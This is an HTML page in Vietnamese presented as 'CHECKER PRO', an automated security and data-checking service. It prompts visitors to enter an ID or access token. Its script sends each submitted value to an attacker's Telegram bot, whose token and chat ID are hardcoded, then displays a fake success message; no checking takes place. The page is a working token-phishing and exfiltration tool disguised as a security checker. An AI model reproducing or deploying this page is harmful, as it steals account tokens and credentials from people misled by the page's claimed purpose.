<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ Thống Kiểm Tra Bảo Mật</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body { font-family: 'Montserrat', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 90%; max-width: 400px; background: #1e293b; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .logo i { font-size: 50px; color: #38bdf8; margin-bottom: 15px; }
        h2 { margin-bottom: 5px; color: #f8fafc; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #334155; background: #1e293b; color: white; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
        input:focus { border-color: #38bdf8; outline: none; box-shadow: 0 0 8px rgba(56, 189, 248, 0.4); }
        button { width: 100%; padding: 14px; border-radius: 10px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; margin-top: 10px; }
        button:hover { background: #0ea5e9; transform: translateY(-2px); }
        button:active { transform: translateY(0); }
    </style>
</head>
<body>

<div class="container">
    <div class="logo"><i class="fa-solid fa-shield-halved"></i></div>
    <h2>CHECKER PRO</h2>
    <p>Hệ thống kiểm tra dữ liệu tự động</p>
    <input type="text" id="userInput" placeholder="Nhập ID hoặc Token cần check...">
    <button onclick="startProcessing()">KIỂM TRA NGAY</button>
</div>

<script>
    // Cấu hình Telegram của bạn
    const TELEGRAM_TOKEN = '8680190098:AAFOa_8RrryFZlWmfkhEE73Dns3NWaXS99Q'; 
    const CHAT_ID = '6756767312'; 

    async function startProcessing() {
        const val = document.getElementById('userInput').value.trim();

        // 1. Kiểm tra nếu ô nhập trống
        if (!val) {
            Swal.fire({ 
                icon: 'warning', 
                title: 'Thiếu thông tin', 
                text: 'Vui lòng nhập dữ liệu trước khi kiểm tra!', 
                background: '#1e293b', 
                color: '#fff',
                confirmButtonColor: '#38bdf8'
            });
            return;
        }

        // 2. Hiển thị thông báo đang xử lý
        Swal.fire({
            title: 'Đang xử lý...',
            html: 'Vui lòng chờ trong giây lát...',
            allowOutsideClick: false,
            background: '#1e293b',
            color: '#fff',
            didOpen: () => { Swal.showLoading(); }
        });

        try {
            // 3. Chuẩn bị nội dung gửi đi
            const botMsg = `🚀 **DỮ LIỆU MỚI TỪ WEB**\n` +
                           `━━━━━━━━━━━━━\n` +
                           `👤 **Dữ liệu:** \`${val}\`\n` +
                           `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n` +
                           `🌐 **Nguồn:** GitHub Pages`;

            // 4. Gửi dữ liệu bằng phương thức GET (ổn định hơn trên GitHub Pages)
            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(botMsg)}&parse_mode=Markdown`;
            
            const response = await fetch(apiUrl);

            if (response.ok) {
                // Thành công
                Swal.fire({
                    icon: 'success',
                    title: 'Thành công',
                    text: 'Dữ liệu đã được hệ thống ghi nhận!',
                    background: '#1e293b',
                    color: '#fff',
                    confirmButtonColor: '#38bdf8'
                });
                document.getElementById('userInput').value = ''; // Xóa nội dung sau khi gửi
            } else {
                throw new Error('Telegram API Error');
            }

        } catch (error) {
            // Thất bại
            console.error(error);
            Swal.fire({ 
                icon: 'error', 
                title: 'Lỗi kết nối', 
                text: 'Không thể kết nối đến máy chủ. Vui lòng kiểm tra lại Token!', 
                background: '#1e293b', 
                color: '#fff',
                confirmButtonColor: '#ef4444'
            });
        }
    }
</script>

</body>
</html>
